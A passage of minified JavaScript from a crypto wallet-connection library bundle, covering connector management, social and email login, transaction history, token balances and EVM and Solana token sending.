e=t,n=AE(de.state),r=Ji.getSnapshot().themeMode,i=Ji.getSnapshot().themeVariables;e?.provider?.syncDappData?.({metadata:n.metadata,sdkVersion:n.sdkVersion,projectId:n.projectId,sdkType:n.sdkType}),e?.provider?.syncTheme({themeMode:r,themeVariables:i,w3mThemeVariables:SE(i,r)}),Ce.setConnectors([t])}else Ce.setConnectors([t])},getAuthConnector(t){const e=t||Y.state.activeChain,n=An.connectors.find(r=>r.id===ge.CONNECTOR_ID.AUTH);if(n)return n?.connectors?.length?n.connectors.find(i=>i.chain===e):n},getAnnouncedConnectorRdns(){return An.connectors.filter(t=>t.type==="ANNOUNCED").map(t=>t.info?.rdns)},getConnectorById(t){return An.allConnectors.find(e=>e.id===t)},getConnector({id:t,rdns:e,namespace:n}){const r=n||Y.state.activeChain;return An.allConnectors.filter(s=>s.chain===r).find(s=>s.explorerId===t||s.info?.rdns===e)},syncIfAuthConnector(t){if(t.id!=="AUTH")return;const e=t,n=AE(de.state),r=Ji.getSnapshot().themeMode,i=Ji.getSnapshot().themeVariables;e?.provider?.syncDappData?.({metadata:n.metadata,sdkVersion:n.sdkVersion,sdkType:n.sdkType,projectId:n.projectId}),e.provider.syncTheme({themeMode:r,themeVariables:i,w3mThemeVariables:SE(i,r)})},getConnectorsByNamespace(t){const e=An.allConnectors.filter(n=>n.chain===t);return Ce.mergeMultiChainConnectors(e)},canSwitchToSmartAccount(t){return Y.checkIfSmartAccountEnabled()&&Zr(t)===Xn.ACCOUNT_TYPES.EOA},selectWalletConnector(t){const e=we.state.data?.redirectView,n=Ce.getConnector({id:t.id,rdns:t.rdns});t1e.handleMobileDeeplinkRedirect(n?.explorerId||t.id,Y.state.activeChain),n?we.push("ConnectingExternal",{connector:n,wallet:t,redirectView:e}):we.push("ConnectingWalletConnect",{wallet:t,redirectView:e})},getConnectors(t){return t?Ce.getConnectorsByNamespace(t):Ce.mergeMultiChainConnectors(An.allConnectors)},setFilterByNamespace(t){An.filterByNamespace=t,An.connectors=Ce.getConnectors(t),Ge.setFilterByNamespace(t)},setConnectorId(t,e){t&&(An.activeConnectorIds={...An.activeConnectorIds,[e]:t},Be.setConnectedConnectorId(e,t))},removeConnectorId(t){An.activeConnectorIds={...An.activeConnectorIds,[t]:void 0},Be.deleteConnectedConnectorId(t)},getConnectorId(t){if(t)return An.activeConnectorIds[t]},isConnected(t){return t?!!An.activeConnectorIds[t]:Object.values(An.activeConnectorIds).some(e=>!!e)},resetConnectorIds(){An.activeConnectorIds={...Wre}},extendConnectorsWithExplorerWallets(t){An.allConnectors.forEach(r=>{const i=t.find(s=>s.id===r.id||s.rdns&&s.rdns===r.info?.rdns);i&&(r.explorerWallet=i)});const e=Ce.getEnabledNamespaces(),n=Ce.getEnabledConnectors(e);An.connectors=Ce.mergeMultiChainConnectors(n)}},Ce=ec(w1e),v1e=1e3,bv={checkNamespaceConnectorId(t,e){return Ce.getConnectorId(t)===e},isSocialProvider(t){return jt.DEFAULT_REMOTE_FEATURES.socials.includes(t)},connectWalletConnect({walletConnect:t,connector:e,closeModalOnConnect:n=!0,redirectViewOnModalClose:r="Connect",onOpen:i,onConnect:s}){return new Promise((o,a)=>{if(t&&Ce.setActiveConnector(e),i?.(xe.isMobile()&&t),r){const l=kt.subscribeKey("open",f=>{f||(we.state.view!==r&&we.replace(r),l(),a(new Error("Modal closed")))})}const c=Y.subscribeKey("activeCaipAddress",l=>{l&&(s?.(),n&&kt.close(),c(),o(gi.parseCaipAddress(l)))})})},connectExternal(t){return new Promise((e,n)=>{const r=Y.subscribeKey("activeCaipAddress",i=>{i&&(kt.close(),r(),e(gi.parseCaipAddress(i)))});ke.connectExternal(t,t.chain).catch(()=>{r(),n(new Error("Connection rejected"))})})},connectSocial({social:t,namespace:e,closeModalOnConnect:n=!0,onOpenFarcaster:r,onConnect:i}){let s,o=!1,a=null;const c=e||Y.state.activeChain,l=Y.subscribeKey("activeCaipAddress",f=>{f&&(n&&kt.close(),l())});return new Promise((f,h)=>{async function m(w){if(w.data?.resultUri)if(w.origin===ge.SECURE_SITE_SDK_ORIGIN){window.removeEventListener("message",m,!1);try{const y=Ce.getAuthConnector(c);if(y&&!o){s&&s.close(),o=!0;const E=w.data.resultUri;tt.sendEvent({type:"track",event:"SOCIAL_LOGIN_REQUEST_USER_DATA",properties:{provider:t}}),Be.setConnectedSocialProvider(t),await ke.connectExternal({id:y.id,type:y.type,socialUri:E},y.chain);const A=Y.state.activeCaipAddress;if(!A){h(new Error("Failed to connect"));return}f(gi.parseCaipAddress(A)),tt.sendEvent({type:"track",event:"SOCIAL_LOGIN_SUCCESS",properties:{provider:t}})}}catch(y){tt.sendEvent({type:"track",event:"SOCIAL_LOGIN_ERROR",properties:{provider:t,message:xe.parseError(y)}}),h(new Error("Failed to connect"))}}else tt.sendEvent({type:"track",event:"SOCIAL_LOGIN_ERROR",properties:{provider:t,message:"Untrusted Origin"}})}async function b(){if(tt.sendEvent({type:"track",event:"SOCIAL_LOGIN_STARTED",properties:{provider:t}}),t==="farcaster"){r?.();const w=kt.subscribeKey("open",E=>{!E&&t==="farcaster"&&(h(new Error("Popup closed")),i?.(),w())}),y=Ce.getAuthConnector();if(y&&!Y.getAccountData(c)?.farcasterUrl)try{const{url:A}=await y.provider.getFarcasterUri();Y.setAccountProp("farcasterUrl",A,c)}catch{h(new Error("Failed to connect to farcaster"))}}else{const w=Ce.getAuthConnector();a=xe.returnOpenHref(`${ge.SECURE_SITE_SDK_ORIGIN}/loading`,"popupWindow","width=600,height=800,scrollbars=yes");try{if(w){const{uri:y}=await w.provider.getSocialRedirectUri({provider:t});if(a&&y){a.location.href=y,s=a;const E=setInterval(()=>{s?.closed&&!o&&(h(new Error("Popup closed")),clearInterval(E))},1e3);window.addEventListener("message",m,!1)}else a?.close(),h(new Error("Failed to initiate social connection"))}}catch{h(new Error("Failed to initiate social connection")),a?.close()}}}b()})},connectEmail({closeModalOnConnect:t=!0,redirectViewOnModalClose:e="Connect",onOpen:n,onConnect:r}){return new Promise((i,s)=>{if(n?.(),e){const a=kt.subscribeKey("open",c=>{c||(we.state.view!==e&&we.replace(e),a(),s(new Error("Modal closed")))})}const o=Y.subscribeKey("activeCaipAddress",a=>{a&&(r?.(),t&&kt.close(),o(),i(gi.parseCaipAddress(a)))})})},async updateEmail(){const t=Be.getConnectedConnectorId(Y.state.activeChain),e=Ce.getAuthConnector();if(!e)throw new Error("No auth connector found");if(t!==ge.CONNECTOR_ID.AUTH)throw new Error("Not connected to email or social");const n=e.provider.getEmail()??"";return await kt.open({view:"UpdateEmailWallet",data:{email:n,redirectView:void 0}}),new Promise((r,i)=>{const s=setInterval(()=>{const a=e.provider.getEmail()??"";a!==n&&(kt.close(),clearInterval(s),o(),r({email:a}))},v1e),o=kt.subscribeKey("open",a=>{a||(we.state.view!=="Connect"&&we.push("Connect"),clearInterval(s),o(),i(new Error("Modal closed")))})})},canSwitchToSmartAccount(t){return Y.checkIfSmartAccountEnabled()&&Zr(t)===Xn.ACCOUNT_TYPES.EOA}};function wx(){const t=Y.state.activeCaipNetwork?.chainNamespace||"eip155",e=Y.state.activeCaipNetwork?.id||1,n=jt.NATIVE_TOKEN_ADDRESS[t];return`${t}:${e}:${n}`}function Zr(t){return Y.getAccountData(t)?.preferredAccountType}function V2(t){return t?Y.state.chains.get(t)?.networkState?.caipNetwork:Y.state.activeCaipNetwork}const Dc={getConnectionStatus(t,e){const n=Ce.state.activeConnectorIds[e],r=ke.getConnections(e);return!!n&&t.connectorId===n?"connected":r.some(o=>o.connectorId.toLowerCase()===t.connectorId.toLowerCase())?"active":"disconnected"},excludeConnectorAddressFromConnections({connections:t,connectorId:e,addresses:n}){return t.map(r=>{if((e?r.connectorId.toLowerCase()===e.toLowerCase():!1)&&n){const s=r.accounts.filter(o=>!n.some(c=>c.toLowerCase()===o.address.toLowerCase()));return{...r,accounts:s}}return r})},excludeExistingConnections(t,e){const n=new Set(t);return e.filter(r=>!n.has(r.connectorId))},getConnectionsByConnectorId(t,e){return t.filter(n=>n.connectorId.toLowerCase()===e.toLowerCase())},getConnectionsData(t){const e=!!de.state.remoteFeatures?.multiWallet,n=Ce.state.activeConnectorIds[t],r=ke.getConnections(t),s=(ke.state.recentConnections.get(t)??[]).filter(a=>Ce.getConnectorById(a.connectorId)),o=Dc.excludeExistingConnections([...r.map(a=>a.connectorId),...n?[n]:[]],s);return e?{connections:r,recentConnections:o}:{connections:r.filter(a=>a.connectorId.toLowerCase()===n?.toLowerCase()),recentConnections:[]}}},jr=ar({transactions:[],transactionsByYear:{},lastNetworkInView:void 0,loading:!1,empty:!1,next:void 0}),E1e={state:jr,subscribe(t){return ji(jr,()=>t(jr))},setLastNetworkInView(t){jr.lastNetworkInView=t},async fetchTransactions(t){if(!t)throw new Error("Transactions can't be fetched without an accountAddress");jr.loading=!0;try{const e=await Bt.fetchTransactions({account:t,cursor:jr.next,chainId:Y.state.activeCaipNetwork?.caipNetworkId}),n=fo.filterSpamTransactions(e.data),r=fo.filterByConnectedChain(n),i=[...jr.transactions,...r];jr.loading=!1,jr.transactions=i,jr.transactionsByYear=fo.groupTransactionsByYearAndMonth(jr.transactionsByYear,r),jr.empty=i.length===0,jr.next=e.next?e.next:void 0}catch{const n=Y.state.activeChain;tt.sendEvent({type:"track",event:"ERROR_FETCH_TRANSACTIONS",properties:{address:t,projectId:de.state.projectId,cursor:jr.next,isSmartAccount:Zr(n)===Xn.ACCOUNT_TYPES.SMART_ACCOUNT}}),on.showError("Failed to fetch transactions"),jr.loading=!1,jr.empty=!0,jr.next=void 0}},groupTransactionsByYearAndMonth(t={},e=[]){const n=t;return e.forEach(r=>{const i=new Date(r.metadata.minedAt).getFullYear(),s=new Date(r.metadata.minedAt).getMonth(),o=n[i]??{},c=(o[s]??[]).filter(l=>l.id!==r.id);n[i]={...o,[s]:[...c,r].sort((l,f)=>new Date(f.metadata.minedAt).getTime()-new Date(l.metadata.minedAt).getTime())}}),n},filterSpamTransactions(t){return t.filter(e=>!e.transfers.every(r=>r.nft_info?.flags.is_spam===!0))},filterByConnectedChain(t){const e=Y.state.activeCaipNetwork?.caipNetworkId;return t.filter(r=>r.metadata.chain===e)},clearCursor(){jr.next=void 0},resetTransactions(){jr.transactions=[],jr.transactionsByYear={},jr.lastNetworkInView=void 0,jr.loading=!1,jr.empty=!1,jr.next=void 0}},fo=ec(E1e,"API_ERROR"),Dn=ar({connections:new Map,recentConnections:new Map,isSwitchingConnection:!1,wcError:!1,buffering:!1,status:"disconnected"});let V0;const _1e={state:Dn,subscribe(t){return ji(Dn,()=>t(Dn))},subscribeKey(t,e){return Mi(Dn,t,e)},_getClient(){return Dn._client},setClient(t){Dn._client=g1(t)},initialize(t){const e=t.filter(n=>!!n.namespace).map(n=>n.namespace);ke.syncStorageConnections(e)},syncStorageConnections(t){const e=Be.getConnections(),n=t??Array.from(Y.state.chains.keys());for(const r of n){const i=e[r]??[],s=new Map(Dn.recentConnections);s.set(r,i),Dn.recentConnections=s}},getConnections(t){return t?Dn.connections.get(t)??[]:[]},hasAnyConnection(t){const e=ke.state.connections;return Array.from(e.values()).flatMap(n=>n).some(({connectorId:n})=>n===t)},async connectWalletConnect({cache:t="auto"}={}){const e=xe.isTelegram()||xe.isSafari()&&xe.isIos();if(t==="always"||t==="auto"&&e){if(V0){await V0,V0=void 0;return}if(!xe.isPairingExpired(Dn?.wcPairingExpiry)){const n=Dn.wcUri;Dn.wcUri=n;return}V0=ke._getClient()?.connectWalletConnect?.().catch(()=>{}),ke.state.status="connecting",await V0,V0=void 0,Dn.wcPairingExpiry=void 0,ke.state.status="connected"}else await ke._getClient()?.connectWalletConnect?.()},async connectExternal(t,e,n=!0){const r=await ke._getClient()?.connectExternal?.(t);n&&Y.setActiveNamespace(e);const i=Ce.state.allConnectors.find(o=>o.id===t?.id),s=t.type==="AUTH"?"email":"browser";return tt.sendEvent({type:"track",event:"CONNECT_SUCCESS",properties:{method:s,name:i?.name||"Unknown",view:we.state.view,walletRank:i?.explorerWallet?.order}}),r},async reconnectExternal(t){await ke._getClient()?.reconnectExternal?.(t);const e=t.chain||Y.state.activeChain;e&&Ce.setConnectorId(t.id,e)},async setPreferredAccountType(t,e){if(!e)return;kt.setLoading(!0,Y.state.activeChain);const n=Ce.getAuthConnector();n&&(Y.setAccountProp("preferredAccountType",t,e),await n.provider.setPreferredAccount(t),Be.setPreferredAccountTypes(Object.entries(Y.state.chains).reduce((r,[i,s])=>{const o=i,a=Zr(o);return a!==void 0&&(r[o]=a),r},{})),await ke.reconnectExternal(n),kt.setLoading(!1,Y.state.activeChain),tt.sendEvent({type:"track",event:"SET_PREFERRED_ACCOUNT_TYPE",properties:{accountType:t,network:Y.state.activeCaipNetwork?.caipNetworkId||""}}))},async signMessage(t){return ke._getClient()?.signMessage(t)},parseUnits(t,e){return ke._getClient()?.parseUnits(t,e)},formatUnits(t,e){return ke._getClient()?.formatUnits(t,e)},updateBalance(t){return ke._getClient()?.updateBalance(t)},async sendTransaction(t){return ke._getClient()?.sendTransaction(t)},async getCapabilities(t){return ke._getClient()?.getCapabilities(t)},async grantPermissions(t){return ke._getClient()?.grantPermissions(t)},async walletGetAssets(t){return ke._getClient()?.walletGetAssets(t)??{}},async estimateGas(t){return ke._getClient()?.estimateGas(t)},async writeContract(t){return ke._getClient()?.writeContract(t)},async getEnsAddress(t){return ke._getClient()?.getEnsAddress(t)},async getEnsAvatar(t){return ke._getClient()?.getEnsAvatar(t)},checkInstalled(t){return ke._getClient()?.checkInstalled?.(t)||!1},resetWcConnection(){Dn.wcUri=void 0,Dn.wcPairingExpiry=void 0,Dn.wcLinking=void 0,Dn.recentWallet=void 0,Dn.status="disconnected",fo.resetTransactions(),Be.deleteWalletConnectDeepLink(),Be.deleteRecentWallet()},resetUri(){Dn.wcUri=void 0,Dn.wcPairingExpiry=void 0,V0=void 0},finalizeWcConnection(t){const{wcLinking:e,recentWallet:n}=ke.state;e&&Be.setWalletConnectDeepLink(e),n&&Be.setAppKitRecent(n),t&&tt.sendEvent({type:"track",event:"CONNECT_SUCCESS",address:t,properties:{method:e?"mobile":"qrcode",name:we.state.data?.wallet?.name||"Unknown",view:we.state.view,walletRank:n?.order}})},setWcBasic(t){Dn.wcBasic=t},setUri(t){Dn.wcUri=t,Dn.wcPairingExpiry=xe.getPairingExpiry()},setWcLinking(t){Dn.wcLinking=t},setWcError(t){Dn.wcError=t,Dn.buffering=!1},setRecentWallet(t){Dn.recentWallet=t},setBuffering(t){Dn.buffering=t},setStatus(t){Dn.status=t},setIsSwitchingConnection(t){Dn.isSwitchingConnection=t},async disconnect({id:t,namespace:e,initialDisconnect:n}={}){try{await ke._getClient()?.disconnect({id:t,chainNamespace:e,initialDisconnect:n})}catch(r){throw new Zl("Failed to disconnect","INTERNAL_SDK_ERROR",r)}},async disconnectConnector({id:t,namespace:e}){try{await ke._getClient()?.disconnectConnector({id:t,namespace:e})}catch(n){throw new Zl("Failed to disconnect connector","INTERNAL_SDK_ERROR",n)}},setConnections(t,e){const n=new Map(Dn.connections);n.set(e,t),Dn.connections=n},async handleAuthAccountSwitch({address:t,namespace:e}){const r=Y.getAccountData(e)?.user?.accounts?.find(s=>s.type==="smartAccount"),i=r&&r.address.toLowerCase()===t.toLowerCase()&&bv.canSwitchToSmartAccount(e)?"smartAccount":"eoa";await ke.setPreferredAccountType(i,e)},async handleActiveConnection({connection:t,namespace:e,address:n}){const r=Ce.getConnectorById(t.connectorId),i=t.connectorId===ge.CONNECTOR_ID.AUTH;if(!r)throw new Error(`No connector found for connection: ${t.connectorId}`);if(i)n&&await ke.handleAuthAccountSwitch({address:n,namespace:e});else return(await ke.connectExternal({id:r.id,type:r.type,provider:r.provider,address:n,chain:e},e))?.address;return n},async handleDisconnectedConnection({connection:t,namespace:e,address:n,closeModalOnConnect:r}){const i=Ce.getConnectorById(t.connectorId),s=t.auth?.name?.toLowerCase(),o=t.connectorId===ge.CONNECTOR_ID.AUTH,a=t.connectorId===ge.CONNECTOR_ID.WALLET_CONNECT;if(!i)throw new Error(`No connector found for connection: ${t.connectorId}`);let c;if(o)if(s&&bv.isSocialProvider(s)){const{address:l}=await bv.connectSocial({social:s,closeModalOnConnect:r,onOpenFarcaster(){kt.open({view:"ConnectingFarcaster"})},onConnect(){we.replace("ProfileWallets")}});c=l}else{const{address:l}=await bv.connectEmail({closeModalOnConnect:r,onOpen(){kt.open({view:"EmailLogin"})},onConnect(){we.replace("ProfileWallets")}});c=l}else if(a){const{address:l}=await bv.connectWalletConnect({walletConnect:!0,connector:i,closeModalOnConnect:r,onOpen(f){const h=f?"AllWallets":"ConnectingWalletConnect";kt.state.open?we.push(h):kt.open({view:h})},onConnect(){we.replace("ProfileWallets")}});c=l}else{const l=await ke.connectExternal({id:i.id,type:i.type,provider:i.provider,chain:e},e);l&&(c=l.address)}return o&&n&&await ke.handleAuthAccountSwitch({address:n,namespace:e}),c},async switchConnection({connection:t,address:e,namespace:n,closeModalOnConnect:r,onChange:i}){let s;const o=Y.getAccountData(n)?.caipAddress;if(o){const{address:c}=gi.parseCaipAddress(o);s=c}const a=Dc.getConnectionStatus(t,n);switch(a){case"connected":case"active":{const c=await ke.handleActiveConnection({connection:t,namespace:n,address:e});if(s&&c){const l=c.toLowerCase()!==s.toLowerCase();i?.({address:c,namespace:n,hasSwitchedAccount:l,hasSwitchedWallet:a==="active"})}break}case"disconnected":{const c=await ke.handleDisconnectedConnection({connection:t,namespace:n,address:e,closeModalOnConnect:r});c&&i?.({address:c,namespace:n,hasSwitchedAccount:!0,hasSwitchedWallet:!0});break}default:throw new Error(`Invalid connection status: ${a}`)}}},ke=ec(_1e),ON={createBalance(t,e){const n={name:t.metadata.name||"",symbol:t.metadata.symbol||"",decimals:t.metadata.decimals||0,value:t.metadata.value||0,price:t.metadata.price||0,iconUrl:t.metadata.iconUrl||""};return{name:n.name,symbol:n.symbol,chainId:e,address:t.address==="native"?void 0:this.convertAddressToCAIP10Address(t.address,e),value:n.value,price:n.price,quantity:{decimals:n.decimals.toString(),numeric:this.convertHexToBalance({hex:t.balance,decimals:n.decimals})},iconUrl:n.iconUrl}},convertHexToBalance({hex:t,decimals:e}){return nB(BigInt(t),e)},convertAddressToCAIP10Address(t,e){return`${e}:${t}`},createCAIP2ChainId(t,e){return`${e}:${parseInt(t,16)}`},getChainIdHexFromCAIP2ChainId(t){const e=t.split(":");if(e.length<2||!e[1])return"0x0";const n=e[1],r=parseInt(n,10);return isNaN(r)?"0x0":`0x${r.toString(16)}`},isWalletGetAssetsResponse(t){return typeof t!="object"||t===null?!1:Object.values(t).every(e=>Array.isArray(e)&&e.every(n=>this.isValidAsset(n)))},isValidAsset(t){return typeof t=="object"&&t!==null&&typeof t.address=="string"&&typeof t.balance=="string"&&(t.type==="ERC20"||t.type==="NATIVE")&&typeof t.metadata=="object"&&t.metadata!==null&&typeof t.metadata.name=="string"&&typeof t.metadata.symbol=="string"&&typeof t.metadata.decimals=="number"&&typeof t.metadata.price=="number"&&typeof t.metadata.iconUrl=="string"}};let kN;async function CH(){if(!kN){const{createPublicClient:t,http:e,defineChain:n}=await pt(async()=>{const{createPublicClient:r,http:i,defineChain:s}=await import("./index-vPdMErzc.js").then(o=>o.i);return{createPublicClient:r,http:i,defineChain:s}},__vite__mapDeps([0,1,2]));kN={createPublicClient:t,http:e,defineChain:n}}return kN}const Mk={getBlockchainApiRpcUrl(t,e){const n=new URL("https://rpc.walletconnect.org/v1/");return n.searchParams.set("chainId",t),n.searchParams.set("projectId",e),n.toString()},async getViemChain(t){const{defineChain:e}=await CH(),{chainId:n}=gi.parseCaipNetworkId(t.caipNetworkId);return e({...t,id:Number(n)})},async createViemPublicClient(t){const{createPublicClient:e,http:n}=await CH(),r=de.state.projectId,i=await Mk.getViemChain(t);if(!i)throw new Error(`Chain ${t.caipNetworkId} not found in viem/chains`);return e({chain:i,transport:n(Mk.getBlockchainApiRpcUrl(t.caipNetworkId,r))})}},sB={async getMyTokensWithBalance(t){const e=Y.getAccountData()?.address,n=Y.state.activeCaipNetwork,r=Ce.getConnectorId("eip155")===ge.CONNECTOR_ID.AUTH;if(!e||!n)return[];const i=`${n.caipNetworkId}:${e}`,s=Be.getBalanceCacheForCaipAddress(i);if(s)return s.balances;if(n.chainNamespace===ge.CHAIN.EVM&&r){const a=await this.getEIP155Balances(e,n);if(a)return this.filterLowQualityTokens(a)}const o=await Bt.getBalance(e,n.caipNetworkId,t);return this.filterLowQualityTokens(o.balances)},async getEIP155Balances(t,e){try{const n=ON.getChainIdHexFromCAIP2ChainId(e.caipNetworkId);if(!(await ke.getCapabilities(t))?.[n]?.assetDiscovery?.supported)return null;const i=await ke.walletGetAssets({account:t,chainFilter:[n]});if(!ON.isWalletGetAssetsResponse(i))return null;const o=(i[n]||[]).map(a=>ON.createBalance(a,e.caipNetworkId));return Be.updateBalanceCache({caipAddress:`${e.caipNetworkId}:${t}`,balance:{balances:o},timestamp:Date.now()}),o}catch{return null}},filterLowQualityTokens(t){return t.filter(e=>e.quantity.decimals!=="0")},async fetchERC20Balance({caipAddress:t,assetAddress:e,caipNetwork:n}){const r=await Mk.createViemPublicClient(n),{address:i}=gi.parseCaipAddress(t),[{result:s},{result:o},{result:a},{result:c}]=await r.multicall({contracts:[{address:e,functionName:"name",args:[],abi:x3},{address:e,functionName:"symbol",args:[],abi:x3},{address:e,functionName:"balanceOf",args:[i],abi:x3},{address:e,functionName:"decimals",args:[],abi:x3}]});return{name:s,symbol:o,decimals:c,balance:a&&c?nB(a,c):"0"}}},DN={adapters:{}},Gre={state:DN,initialize(t){DN.adapters={...t}},get(t){return DN.adapters[t]}},vx={eip155:void 0,solana:void 0,polkadot:void 0,bip122:void 0,cosmos:void 0,sui:void 0,stacks:void 0,ton:void 0},Lo=ar({providers:{...vx},providerIds:{...vx}}),Rn={state:Lo,subscribeKey(t,e){return Mi(Lo,t,e)},subscribe(t){return ji(Lo,()=>{t(Lo)})},subscribeProviders(t){return ji(Lo.providers,()=>t(Lo.providers))},setProvider(t,e){t&&e&&(Lo.providers[t]=g1(e))},getProvider(t){if(t)return Lo.providers[t]},setProviderId(t,e){e&&(Lo.providerIds[t]=e)},getProviderId(t){if(t)return Lo.providerIds[t]},reset(){Lo.providers={...vx},Lo.providerIds={...vx}},resetChain(t){Lo.providers[t]=void 0,Lo.providerIds[t]=void 0}},eb=ar({loading:!1,open:!1,selectedNetworkId:void 0,activeChain:void 0,initialized:!1}),ku={state:eb,subscribe(t){return ji(eb,()=>t(eb))},subscribeOpen(t){return Mi(eb,"open",t)},set(t){Object.assign(eb,{...eb,...t})}},A1e={async getTokenList(t){return(await Bt.fetchSwapTokens({chainId:t}))?.tokens?.map(r=>({...r,eip2612:!1,quantity:{decimals:"0",numeric:"0"},price:0,value:0}))||[]},async fetchGasPrice(){const t=Y.state.activeCaipNetwork;if(!t)return null;try{switch(t.chainNamespace){case"solana":const e=(await ke?.estimateGas({chainNamespace:"solana"}))?.toString();return{standard:e,fast:e,instant:e};case"eip155":default:return await Bt.fetchGasPrice({chainId:t.caipNetworkId})}}catch{return null}},async fetchSwapAllowance({tokenAddress:t,userAddress:e,sourceTokenAmount:n,sourceTokenDecimals:r}){const i=await Bt.fetchSwapAllowance({tokenAddress:t,userAddress:e});if(i?.allowance&&n&&r){const s=ke.parseUnits(n,r)||0;return BigInt(i.allowance)>=s}return!1},async getMyTokensWithBalance(t){const e=await sB.getMyTokensWithBalance(t);return Y.setAccountProp("tokenBalance",e,Y.state.activeChain),this.mapBalancesToSwapTokens(e)},mapBalancesToSwapTokens(t){return t?.map(e=>({...e,address:e?.address?e.address:wx(),decimals:parseInt(e.quantity.decimals,10),logoUri:e.iconUrl,eip2612:!1}))||[]},async handleSwapError(t){try{const e=t?.cause;return e?.json&&(await e.json())?.reasons?.[0]?.description?.includes("insufficient liquidity")?"Insufficient liquidity":void 0}catch{return}}},Cn=ar({tokenBalances:[],loading:!1}),C1e={state:Cn,subscribe(t){return ji(Cn,()=>t(Cn))},subscribeKey(t,e){return Mi(Cn,t,e)},setToken(t){t&&(Cn.token=g1(t))},setTokenAmount(t){Cn.sendTokenAmount=t},setReceiverAddress(t){Cn.receiverAddress=t},setReceiverProfileImageUrl(t){Cn.receiverProfileImageUrl=t},setReceiverProfileName(t){Cn.receiverProfileName=t},setNetworkBalanceInUsd(t){Cn.networkBalanceInUSD=t},setLoading(t){Cn.loading=t},getSdkEventProperties(t){return{message:xe.parseError(t),isSmartAccount:Zr(Y.state.activeChain)===Xn.ACCOUNT_TYPES.SMART_ACCOUNT,token:Cn.token?.symbol||"",amount:Cn.sendTokenAmount??0,network:Y.state.activeCaipNetwork?.caipNetworkId||""}},async sendToken(){try{switch(rn.setLoading(!0),Y.state.activeCaipNetwork?.chainNamespace){case"eip155":await rn.sendEvmToken();return;case"solana":await rn.sendSolanaToken();return;default:throw new Error("Unsupported chain")}}catch(t){throw Ka.isUserRejectedRequestError(t)?new JD(t):t}finally{rn.setLoading(!1)}},async sendEvmToken(){const t=Y.state.activeChain;if(!t)throw new Error("SendController:sendEvmToken - activeChainNamespace is required");const e=Zr(t);if(!rn.state.sendTokenAmount||!rn.state.receiverAddress)throw new Error("An amount and receiver address are required");if(!rn.state.token)throw new Error("A token is required");if(rn.state.token?.address){tt.sendEvent({type:"track",event:"SEND_INITIATED",properties:{isSmartAccount:e===Xn.ACCOUNT_TYPES.SMART_ACCOUNT,token:rn.state.token.address,amount:rn.state.sendTokenAmount,network:Y.state.activeCaipNetwork?.caipNetworkId||""}});const{hash:n}=await rn.sendERC20Token({receiverAddress:rn.state.receiverAddress,tokenAddress:rn.state.token.address,sendTokenAmount:rn.state.sendTokenAmount,decimals:rn.state.token.quantity.decimals});n&&(Cn.hash=n)}else{tt.sendEvent({type:"track",event:"SEND_INITIATED",properties:{isSmartAccount:e===Xn.ACCOUNT_TYPES.SMART_ACCOUNT,token:rn.state.token.symbol||"",amount:rn.state.sendTokenAmount,network:Y.state.activeCaipNetwork?.caipNetworkId||""}});const{hash:n}=await rn.sendNativeToken({receiverAddress:rn.state.receiverAddress,sendTokenAmount:rn.state.sendTokenAmount,decimals:rn.state.token.quantity.decimals});n&&(Cn.hash=n)}},async fetchTokenBalance(t){Cn.loading=!0;const e=Y.state.activeChain,n=Y.state.activeCaipNetwork?.caipNetworkId,r=Y.state.activeCaipNetwork?.chainNamespace,i=Y.getAccountData(e)?.caipAddress??Y.state.activeCaipAddress,s=i?xe.getPlainAddress(i):void 0;if(Cn.lastRetry&&!xe.isAllowedRetry(Cn.lastRetry,30*jt.ONE_SEC_MS))return Cn.loading=!1,[];try{if(s&&n&&r){const o=await sB.getMyTokensWithBalance();return Cn.tokenBalances=o,Cn.lastRetry=void 0,o}}catch(o){Cn.lastRetry=Date.now(),t?.(o),on.showError("Token Balance Unavailable")}finally{Cn.loading=!1}return[]},fetchNetworkBalance(){if(Cn.tokenBalances.length===0)return;const t=A1e.mapBalancesToSwapTokens(Cn.tokenBalances);if(!t)return;const e=t.find(n=>n.address===wx());e&&(Cn.networkBalanceInUSD=e?CE.multiply(e.quantity.numeric,e.price).toString():"0")},async sendNativeToken(t){we.pushTransactionStack({});const e=t.receiverAddress,n=Y.getAccountData()?.address,r=ke.parseUnits(t.sendTokenAmount.toString(),Number(t.decimals)),s=await ke.sendTransaction({chainNamespace:ge.CHAIN.EVM,to:e,address:n,data:"0x",value:r??BigInt(0)});return tt.sendEvent({type:"track",event:"SEND_SUCCESS",properties:{isSmartAccount:Zr("eip155")===Xn.ACCOUNT_TYPES.SMART_ACCOUNT,token:rn.state.token?.symbol||"",amount:t.sendTokenAmount,network:Y.state.activeCaipNetwork?.caipNetworkId||"",hash:s||""}}),ke._getClient()?.updateBalance("eip155"),rn.resetSend(),{hash:s}},async sendERC20Token(t){we.pushTransactionStack({onSuccess(){we.replace("Account")}});const e=ke.parseUnits(t.sendTokenAmount.toString(),Number(t.decimals)),n=Y.getAccountData()?.address;if(n&&t.sendTokenAmount&&t.receiverAddress&&t.tokenAddress){const r=xe.getPlainAddress(t.tokenAddress);if(!r)throw new Error("SendController:sendERC20Token - tokenAddress is required");const i=await ke.writeContract({fromAddress:n,tokenAddress:r,args:[t.receiverAddress,e??BigInt(0)],method:"transfer",abi:ume.getERC20Abi(r),chainNamespace:ge.CHAIN.EVM});return tt.sendEvent({type:"track",event:"SEND_SUCCESS",properties:{isSmartAccount:Zr("eip155")===Xn.ACCOUNT_TYPES.SMART_ACCOUNT,token:rn.state.token?.symbol||"",amount:t.sendTokenAmount,network:Y.state.activeCaipNetwork?.caipNetworkId||"",hash:i||""}}),rn.resetSend(),{hash:i}}return{hash:void 0}},async sendSolanaToken(){if(!rn.state.sendTokenAmount||!rn.state.receiverAddress)throw new Error("An amount and receiver address are required");we.pushTransactionStack({onSuccess(){we.replace("Account")}});let t;rn.state.token&&rn.state.token.address!==jt.SOLANA_NATIVE_TOKEN_ADDRESS&&(xe.isCaipAddress(rn.state.token.address)?t=xe.getPlainAddress(rn.state.token.address):t=rn.state.token.address);const e=await ke.sendTransaction({chainNamespace:"solana",tokenMint:t,to:rn.state.receiverAddress,value:rn.state.sendTokenAmount});e&&(Cn.hash=e),ke._getClient()?.updateBalance("solana"),tt.sendEvent({type:"track",event:"SEND_SUCCESS",properties:{isSmartAccount:!1,token:rn.state.token?.symbol||"",amount:rn.state.sendTokenAmount,network:Y.state.activeCaipNetwork?.caipNetworkId||"",hash:e||""}}),rn.resetSend()},resetSend(){Cn.token=void 0,Cn.sendTokenAmount=void 0,Cn.receiverAddress=void 0,Cn.receiverProfileImageUrl=void 0,Cn.receiverProfileName=void 